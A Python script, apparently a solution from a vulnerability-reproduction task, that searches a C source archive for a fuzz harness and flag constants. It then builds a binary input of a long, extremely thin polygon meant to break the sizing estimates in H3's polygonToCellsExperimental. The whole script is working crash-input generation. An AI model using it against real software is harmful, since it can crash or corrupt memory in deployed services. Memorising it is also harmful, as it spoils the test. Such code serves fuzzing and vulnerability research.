import os
import re
import struct
import tarfile
import zipfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        overlapping_flag = self._find_overlapping_flag(src_path) or 1
        header_len_mode = self._infer_header_mode(src_path)

        # Polygon parameters chosen to create a very long, extremely thin strip
        # which tends to stress polyfill sizing estimates.
        res = 7
        flags = overlapping_flag

        nverts = 64
        lat0 = 0.0
        w = 1e-6
        lat_s = lat0 - w * 0.5
        lat_n = lat0 + w * 0.5
        lon_range = 1.0  # radians
        half = nverts // 2

        coords: List[Tuple[float, float]] = []
        # CCW loop: south edge W->E, then north edge E->W
        for i in range(half):
            t = i / (half - 1) if half > 1 else 0.0
            lon = -lon_range + (2.0 * lon_range) * t
            coords.append((lat_s, lon))
        for i in range(half):
            t = i / (half - 1) if half > 1 else 0.0
            lon = lon_range - (2.0 * lon_range) * t
            coords.append((lat_n, lon))

        if header_len_mode == 8:
            out = bytearray()
            out += struct.pack("<I", res)
            out += struct.pack("<I", flags)
            for lat, lon in coords:
                out += struct.pack("<d", float(lat))
                out += struct.pack("<d", float(lon))
            return bytes(out)
        elif header_len_mode == 2:
            out = bytearray()
            out += struct.pack("B", res & 0xFF)
            out += struct.pack("B", flags & 0xFF)
            for lat, lon in coords:
                out += struct.pack("<d", float(lat))
                out += struct.pack("<d", float(lon))
            return bytes(out)
        elif header_len_mode == 1:
            out = bytearray()
            out += struct.pack("B", res & 0xFF)
            for lat, lon in coords:
                out += struct.pack("<d", float(lat))
                out += struct.pack("<d", float(lon))
            return bytes(out)

        # Fallback: match common 8-byte header layout
        out = bytearray()
        out += struct.pack("<I", res)
        out += struct.pack("<I", flags)
        for lat, lon in coords:
            out += struct.pack("<d", float(lat))
            out += struct.pack("<d", float(lon))
        return bytes(out)

    def _iter_archive_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not self._looks_like_source(name):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    yield name, text
            return

        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.is_dir():
                        continue
                    name = zi.filename
                    if not self._looks_like_source(name):
                        continue
                    if zi.file_size <= 0 or zi.file_size > 2_000_000:
                        continue
                    try:
                        data = zf.read(zi)
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    yield name, text
            return

        # Not an archive; try to walk directory
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    rel = os.path.relpath(path, src_path)
                    if not self._looks_like_source(rel):
                        continue
                    try:
                        st = os.stat(path)
                    except Exception:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    yield rel, text

    def _looks_like_source(self, name: str) -> bool:
        lower = name.lower()
        return lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hxx"))

    def _find_overlapping_flag(self, src_path: str) -> Optional[int]:
        patterns = [
            re.compile(r'^\s*#\s*define\s+(POLYGON_TO_CELLS_[A-Z0-9_]*OVERLAPPING[A-Z0-9_]*)\s+([0-9]+)\s*$', re.M),
            re.compile(r'^\s*#\s*define\s+(POLYGON_TO_CELLS_[A-Z0-9_]*OVERLAPPING[A-Z0-9_]*)\s+(0x[0-9a-fA-F]+)\s*$', re.M),
            re.compile(r'^\s*enum\s+[A-Za-z0-9_]*\s*\{([^}]+)\}\s*;', re.S | re.M),
        ]

        best_name = None
        best_val = None

        for _, text in self._iter_archive_text_files(src_path):
            if "POLYGON_TO_CELLS" not in text or "OVERLAPPING" not in text:
                continue

            for pat in patterns[:2]:
                for m in pat.finditer(text):
                    name = m.group(1)
                    val_s = m.group(2)
                    try:
                        val = int(val_s, 0)
                    except Exception:
                        continue
                    if "BBOX" in name or "BOX" in name:
                        continue
                    best_name, best_val = name, val
                    break
                if best_val is not None:
                    break
            if best_val is not None:
                break

            # Try enum parsing
            m = patterns[2].search(text)
            if m:
                body = m.group(1)
                if "OVERLAPPING" not in body or "POLYGON_TO_CELLS" not in body:
                    continue
                for line in body.split(","):
                    if "OVERLAPPING" not in line or "POLYGON_TO_CELLS" not in line:
                        continue
                    mm = re.search(r'\b(POLYGON_TO_CELLS_[A-Z0-9_]*OVERLAPPING[A-Z0-9_]*)\b\s*(?:=\s*([0-9]+|0x[0-9a-fA-F]+))?', line)
                    if not mm:
                        continue
                    name = mm.group(1)
                    val_s = mm.group(2)
                    if val_s is None:
                        continue
                    if "BBOX" in name or "BOX" in name:
                        continue
                    try:
                        val = int(val_s, 0)
                    except Exception:
                        continue
                    best_name, best_val = name, val
                    break
                if best_val is not None:
                    break

        return best_val

    def _infer_header_mode(self, src_path: str) -> int:
        # Try to locate a harness for polygonToCellsExperimental and infer how it reads inputs.
        harness_texts: List[str] = []
        for _, text in self._iter_archive_text_files(src_path):
            if "LLVMFuzzerTestOneInput" in text and "polygonToCellsExperimental" in text:
                harness_texts.append(text)
            elif "LLVMFuzzerTestOneInput" in text and "PolygonToCellsExperimental" in text:
                harness_texts.append(text)

        if not harness_texts:
            # If no direct mention, still try likely fuzz targets.
            for _, text in self._iter_archive_text_files(src_path):
                if "LLVMFuzzerTestOneInput" in text and ("polygonToCells" in text or "maxPolygonToCellsSizeExperimental" in text):
                    harness_texts.append(text)
                    if len(harness_texts) >= 3:
                        break

        if not harness_texts:
            return 8

        text = "\n".join(harness_texts)

        # Look for 8-byte header patterns: data+8, size<8, memcpy from data+4, etc.
        if re.search(r'\bsize\s*<\s*8\b', text) or "data + 8" in text or "data+8" in text:
            return 8
        if re.search(r'\bmemcpy\s*\(\s*&\w+\s*,\s*data\s*,\s*4\s*\)', text) and (
            re.search(r'\bmemcpy\s*\(\s*&\w+\s*,\s*data\s*\+\s*4\s*,\s*4\s*\)', text) or "data+4" in text or "data + 4" in text
        ):
            return 8
        if re.search(r'\buint32_t\s+\w+\s*=\s*\*\s*\(\s*const\s+uint32_t\s*\*\s*\)\s*data', text) and (
            re.search(r'\[\s*1\s*\]', text) or "((const uint32_t*)data)[1]" in text or "((const uint32_t *)data)[1]" in text
        ):
            return 8

        # Look for byte header patterns
        if re.search(r'\bres\s*=\s*data\s*\[\s*0\s*\]', text):
            if re.search(r'\bflags\s*=\s*data\s*\[\s*1\s*\]', text):
                return 2
            return 1

        return 8